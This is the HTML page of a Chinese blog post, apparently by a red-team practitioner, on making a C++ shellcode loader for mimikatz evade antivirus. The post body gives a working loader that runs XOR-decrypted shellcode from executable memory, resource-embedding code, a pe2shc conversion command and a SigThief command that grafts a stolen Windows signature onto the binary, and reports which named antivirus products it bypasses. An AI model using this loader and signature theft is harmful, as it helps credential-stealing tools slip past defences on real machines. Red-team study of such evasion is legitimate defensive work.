@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="最近一段时间都在忙着红队项目和攻防类项目，一直没时间去把笔记脱敏转成博客。以后随缘更新吧，有些东西太容易被溯源了….">
+<meta property="og:type" content="article">
+<meta property="og:title" content="C++变形免杀初探（三）">
+<meta property="og:url" content="https://chenzidu.github.io/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="最近一段时间都在忙着红队项目和攻防类项目，一直没时间去把笔记脱敏转成博客。以后随缘更新吧，有些东西太容易被溯源了….">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://chenzidu.github.io/1.png">
+<meta property="og:image" content="https://chenzidu.github.io/2.png">
+<meta property="og:image" content="https://chenzidu.github.io/3.png">
+<meta property="og:image" content="https://chenzidu.github.io/4.png">
+<meta property="og:image" content="https://chenzidu.github.io/5.png">
+<meta property="og:image" content="https://chenzidu.github.io/6.png">
+<meta property="og:image" content="https://chenzidu.github.io/7.png">
+<meta property="og:image" content="https://chenzidu.github.io/8.png">
+<meta property="og:image" content="https://chenzidu.github.io/9.png">
+<meta property="article:published_time" content="2024-03-11T07:09:02.000Z">
+<meta property="article:modified_time" content="2024-03-11T07:25:18.306Z">
+<meta property="article:author" content="ChenZIDu">
+<meta property="article:tag" content="C++">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://chenzidu.github.io/1.png">
+
+<link rel="canonical" href="https://chenzidu.github.io/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>C++变形免杀初探（三） | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Chen'Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          C++变形免杀初探（三）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-11 15:09:02 / 修改时间：15:25:18" itemprop="dateCreated datePublished" datetime="2024-03-11T15:09:02+08:00">2024-03-11</time>
+            </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">1.2k(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">4(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2024/03/11/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>最近一段时间都在忙着红队项目和攻防类项目，一直没时间去把笔记脱敏转成博客。以后随缘更新吧，有些东西太容易被溯源了….</p>
+<a id="more"></a>
+<p><a name="HATC5"></a></p>
+<h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h1><p><a name="IOUfU"></a></p>
+<h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><p>分离免杀应该是最简单的免杀方式，毕竟shellcode都在其他文件中，静态查杀也只能查加载器。我们直接将mimiktz在github中的程序进行shellcode转换。<br />使用项目：<a href="https://github.com/hasherezade/pe_to_shellcode" target="_blank" rel="noopener">https://github.com/hasherezade/pe_to_shellcode</a></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\<span class="selector-tag">pe2shc</span><span class="selector-class">.exe</span> .\<span class="selector-tag">mimikatz_64</span><span class="selector-class">.exe</span> <span class="selector-tag">mim_64</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/1.png"></p>
+<p><br />简单写一个shellcode加载器</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span>* exec = VirtualAlloc(<span class="number">0</span>, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (exec == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    perror(<span class="string">"VirtualAlloc"</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(exec, data, payload_len);</span><br><span class="line">dncrypt((<span class="keyword">char</span>*)exec, payload_len, <span class="built_in">buffer</span> + (<span class="built_in">strlen</span>(<span class="built_in">buffer</span>) - <span class="number">8</span>), <span class="number">8</span>);</span><br><span class="line"><span class="comment">// 转换为函数指针并执行</span></span><br><span class="line"><span class="keyword">void</span> (*func)() = (<span class="keyword">void</span> (*)())exec;</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
+<p><a name="ahiOz"></a></p>
+<h2 id="xor加密部分"><a href="#xor加密部分" class="headerlink" title="xor加密部分"></a>xor加密部分</h2><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void XOR(char* data, size_t data_len, char* key, size_t key_len) &#123;</span><br><span class="line">    int <span class="built_in">j</span>;</span><br><span class="line">    <span class="built_in">j</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (int <span class="built_in">i</span> = <span class="number">0</span>; <span class="built_in">i</span> &lt; data_len; <span class="built_in">i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">j</span> == key_len - <span class="number">1</span>) <span class="built_in">j</span> = <span class="number">0</span>;</span><br><span class="line">        data[<span class="built_in">i</span>] = data[<span class="built_in">i</span>] ^ key[<span class="built_in">j</span>];</span><br><span class="line">        <span class="built_in">j</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a name="etenN"></a></p>
+<h2 id="文件加载部分"><a href="#文件加载部分" class="headerlink" title="文件加载部分"></a>文件加载部分</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span>* <span class="title">inputFile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">int</span>&amp; len)</span> </span>&#123;</span><br><span class="line">    FILE* fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> err = fopen_s(&amp;fp, filename, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (err != <span class="number">0</span> || !fp) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    len = ftell(fp);</span><br><span class="line">    rewind(fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>* lpAddress = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)<span class="built_in">malloc</span>(len);</span><br><span class="line">    fread(lpAddress, <span class="number">1</span>, len, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> lpAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main&#123;&#125;&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *payload;</span><br><span class="line">    <span class="keyword">int</span>  payload_len = <span class="number">1373696</span>;  <span class="comment">//大小为shellcode文件大小,用sizeof方法也行</span></span><br><span class="line">    payload = inputFile(<span class="string">"mim_e.txt"</span>, payload_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2.png"></p>
+<p><a name="zUB9y"></a></p>
+<h2 id="查杀分析"><a href="#查杀分析" class="headerlink" title="查杀分析"></a>查杀分析</h2><p><a name="buTQw"></a></p>
+<h3 id="常见的杀软及其特点-转自锦鲤安全"><a href="#常见的杀软及其特点-转自锦鲤安全" class="headerlink" title="常见的杀软及其特点(转自锦鲤安全)"></a><strong>常见的杀软及其特点(转自锦鲤安全)</strong></h3><p><a name="gFTwd"></a></p>
+<h4 id="常见杀软特点总结"><a href="#常见杀软特点总结" class="headerlink" title="常见杀软特点总结"></a><strong>常见杀软特点总结</strong></h4><p>杀软一般通过一下几点来检测恶意软件和行为：</p>
+<ol>
+<li><strong>静态查杀</strong>：最基本的查杀方式，主要通过对文件的特征码进行扫描，匹配已知的病毒特征库。如果发现文件特征码与病毒特征库中的某个病毒特征码相匹配，就判断该文件为病毒；部分杀软会在静态查杀时将程序放入沙箱中运行几秒的方式以检测程序是否是恶意程序。</li>
+<li><strong>动态（主动）查杀</strong>：通过在程序运行时扫描程序内存是否匹配病毒特征的方式主动发现恶意程序。在 EDR 中还会挂钩敏感的 Windows API，在程序调用到被挂钩的 API 时检查函数参数和调用栈以检测恶意程序。</li>
+<li><strong>流量监控</strong>：监控网络流量，分析网络数据包，如果发现异常流量或者已知的恶意流量特征，就可能是恶意软件在进行网络活动。</li>
+<li><strong>行为监控</strong>：监控程序的运行行为，如文件操作、注册表操作等。如果发现某个程序的行为超出了正常范围，就可能是恶意软件。</li>
+</ol>
+<p>常见杀软特点如下：</p>
+<ul>
+<li><strong>火绒</strong>：静态查杀能力弱，没有动态查杀，横向移动防护比较强，frp 等内网穿透工具会受到影响。</li>
+<li><strong>360安全卫士&#x2F;360杀毒</strong>：静态查杀能力较强，没有动态查杀，如果开启了核晶模式，则行为查杀比较强，注入进程等敏感行为会被拦截；核晶模式在物理机中默认开启，在虚拟机中默认关闭。</li>
+<li><strong>360QVM</strong>：360QVM 简单的说就是使用了机器学习辅助查杀，在360杀毒引擎设置中开启 360QVM 后静态查杀会变得非常流氓，有一点特征就会被查杀。</li>
+<li><strong>Windows Defender</strong>：静态查杀能力较强，动态查杀较强，监控 HTTP 流量。</li>
+<li><strong>卡巴斯基</strong>：普通版静态查杀能力一般，企业版静态查杀能力较强，动态查杀较强。</li>
+<li><strong>ESET</strong>：静态查杀能力较强，没有动态查杀。<br><a name="ziGD4"></a></li>
+</ul>
+<h3 id="软件分析"><a href="#软件分析" class="headerlink" title="软件分析"></a>软件分析</h3><p>分离免杀，但是静态查杀效果不行，360云查杀没过去、卡巴斯基过不去。只能过火绒，defender。<br />由于是shellcode加载程序，所以动态查杀基本没啥特征，我们优先考虑静态过，动态一般流量侧查杀比较多，我们只是加载个程序目前不在考虑范围内。<br />继续改！<br><a name="aXIGx"></a></p>
+<h1 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h1><p><a name="UvDgb"></a></p>
+<h2 id="添加ico"><a href="#添加ico" class="headerlink" title="添加ico"></a>添加ico</h2><p>添加 -&gt;资源-&gt; ico<br /></p>
+<p><img src="/3.png"></p>
+<p><a name="VyZwz"></a></p>
+<h2 id="添加签名"><a href="#添加签名" class="headerlink" title="添加签名"></a>添加签名</h2><p>在c:\windows\system32里找一个近期的windows签名文件。<br />利用sigthief.py添加签名。<br />项目地址：<a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">https://github.com/secretsquirrel/SigThief</a></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">sigthief</span><span class="selector-class">.py</span> <span class="selector-tag">-t</span> <span class="selector-tag">test</span><span class="selector-class">.txt</span> <span class="selector-tag">-t</span> <span class="selector-tag">cmd</span><span class="selector-class">.exe</span> <span class="selector-tag">-o</span> <span class="selector-tag">mi_test</span><span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/4.png"></p>
+<p><a name="oCuWp"></a></p>
+<h2 id="杀软测试"><a href="#杀软测试" class="headerlink" title="杀软测试"></a>杀软测试</h2><p>目前可过：defender、360、火绒<br />不可过：卡巴斯基<br><a name="zNDNI"></a></p>
+<h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><p><a name="jWyxD"></a></p>
+<h2 id="动态key"><a href="#动态key" class="headerlink" title="动态key"></a>动态key</h2><p>修改为动态key进行xor加密。这块代码就不给了，主要思路就是拿每台机器都会有的特征来当key（比如说系统路径、系统名、注册表之类的）。<br><a name="wO5Kr"></a></p>
+<h2 id="捆绑shellcode"><a href="#捆绑shellcode" class="headerlink" title="捆绑shellcode"></a>捆绑shellcode</h2><p>再将shellcode加载进项目资源，导入txt到项目资源中。修改分离免杀读取方式。<br />修改如下：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HRSRC hRes =  FindResource(<span class="name">NULL</span>, MAKEINTRESOURCE(<span class="name">IDR_TEXT1</span>), TEXT(<span class="string">"TEXT"</span>))<span class="comment">;</span></span><br><span class="line">HGLOBAL hData = LoadResource(<span class="name">NULL</span>, hRes)<span class="comment">;</span></span><br><span class="line">char* data = (<span class="name">char*</span>)LockResource(<span class="name">hData</span>)<span class="comment">;</span></span><br><span class="line">DWORD dataSize = SizeofResource(<span class="name">NULL</span>, hRes)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/5.png"></p>
+<p><a name="dKcI2"></a></p>
+<h2 id="免杀效果展示"><a href="#免杀效果展示" class="headerlink" title="免杀效果展示"></a>免杀效果展示</h2><p><a name="FQqoK"></a></p>
+<h3 id="defender-静态、动态查杀"><a href="#defender-静态、动态查杀" class="headerlink" title="defender 静态、动态查杀"></a>defender 静态、动态查杀</h3><p><img src="/6.png"></p>
+<p><a name="UXOaw"></a></p>
+<h3 id="卡巴斯基-静态、动态查杀"><a href="#卡巴斯基-静态、动态查杀" class="headerlink" title="卡巴斯基 静态、动态查杀"></a>卡巴斯基 静态、动态查杀</h3><p><img src="/7.png"></p>
+<p><a name="eqCLA"></a></p>
+<h3 id="360-静态、行为查杀"><a href="#360-静态、行为查杀" class="headerlink" title="360 静态、行为查杀"></a>360 静态、行为查杀</h3><p><img src="/8.png"></p>
+<p><a name="Z5oDA"></a></p>
+<h3 id="火绒-静态"><a href="#火绒-静态" class="headerlink" title="火绒 静态"></a>火绒 静态</h3><p><img src="/9.png"></p>
+<p><a name="Cpb3H"></a></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/bNCm1mxDHz7euZ685SQvag" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/bNCm1mxDHz7euZ685SQvag</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/C/" rel="tag"># C++</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/29/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/" rel="prev" title="C++变形免杀初探（二）">
+      <i class="fa fa-chevron-left"></i> C++变形免杀初探（二）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#第一部分"><span class="nav-number">1.</span> <span class="nav-text">第一部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#分离免杀"><span class="nav-number">1.1.</span> <span class="nav-text">分离免杀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xor加密部分"><span class="nav-number">1.2.</span> <span class="nav-text">xor加密部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件加载部分"><span class="nav-number">1.3.</span> <span class="nav-text">文件加载部分</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#查杀分析"><span class="nav-number">1.4.</span> <span class="nav-text">查杀分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见的杀软及其特点-转自锦鲤安全"><span class="nav-number">1.4.1.</span> <span class="nav-text">常见的杀软及其特点(转自锦鲤安全)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#常见杀软特点总结"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">常见杀软特点总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#软件分析"><span class="nav-number">1.4.2.</span> <span class="nav-text">软件分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第二部分"><span class="nav-number">2.</span> <span class="nav-text">第二部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#添加ico"><span class="nav-number">2.1.</span> <span class="nav-text">添加ico</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#添加签名"><span class="nav-number">2.2.</span> <span class="nav-text">添加签名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#杀软测试"><span class="nav-number">2.3.</span> <span class="nav-text">杀软测试</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#第三部分"><span class="nav-number">3.</span> <span class="nav-text">第三部分</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#动态key"><span class="nav-number">3.1.</span> <span class="nav-text">动态key</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#捆绑shellcode"><span class="nav-number">3.2.</span> <span class="nav-text">捆绑shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#免杀效果展示"><span class="nav-number">3.3.</span> <span class="nav-text">免杀效果展示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#defender-静态、动态查杀"><span class="nav-number">3.3.1.</span> <span class="nav-text">defender 静态、动态查杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#卡巴斯基-静态、动态查杀"><span class="nav-number">3.3.2.</span> <span class="nav-text">卡巴斯基 静态、动态查杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#360-静态、行为查杀"><span class="nav-number">3.3.3.</span> <span class="nav-text">360 静态、行为查杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#火绒-静态"><span class="nav-number">3.3.4.</span> <span class="nav-text">火绒 静态</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.4.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChenZIDu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">ChenZIDu</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">95</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/chenzidu" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;chenzidu" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:oinsm@outlook.com" title="E-Mail → mailto:oinsm@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChenZIDu1" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChenZIDu1" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.loongten.com/" title="https:&#x2F;&#x2F;www.loongten.com&#x2F;" rel="noopener" target="_blank">Keac's</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://hsnico.github.io/" title="https:&#x2F;&#x2F;hsnico.github.io" rel="noopener" target="_blank">Hsnico'blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
